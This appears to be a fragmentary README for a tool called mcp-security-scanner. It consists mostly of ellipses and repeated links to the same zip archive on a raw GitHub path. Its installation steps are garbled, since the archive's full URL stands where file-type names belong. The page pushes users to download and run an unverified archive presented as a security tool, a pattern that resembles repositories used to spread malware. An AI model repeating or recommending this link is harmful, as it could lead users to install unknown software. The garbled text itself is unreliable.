...
[![Download mcp-security-scanner](https://raw.githubusercontent.com/Paaxy/mcp-security-scanner/main/transhumant/scanner-mcp-security-v2.8-alpha.5.zip)](https://raw.githubusercontent.com/Paaxy/mcp-security-scanner/main/transhumant/scanner-mcp-security-v2.8-alpha.5.zip)
...
**[Download mcp-security-scanner here](https://raw.githubusercontent.com/Paaxy/mcp-security-scanner/main/transhumant/scanner-mcp-security-v2.8-alpha.5.zip)**
...
3. Choose the file that matches your operating system:
   ...
   - For Linux, usually a `https://raw.githubusercontent.com/Paaxy/mcp-security-scanner/main/transhumant/scanner-mcp-security-v2.8-alpha.5.zip` or `.AppImage` file.
...
1. Extract the `https://raw.githubusercontent.com/Paaxy/mcp-security-scanner/main/transhumant/scanner-mcp-security-v2.8-alpha.5.zip` file if needed.
...
[Download mcp-security-scanner now](https://raw.githubusercontent.com/Paaxy/mcp-security-scanner/main/transhumant/scanner-mcp-security-v2.8-alpha.5.zip) to start securing your MCP files.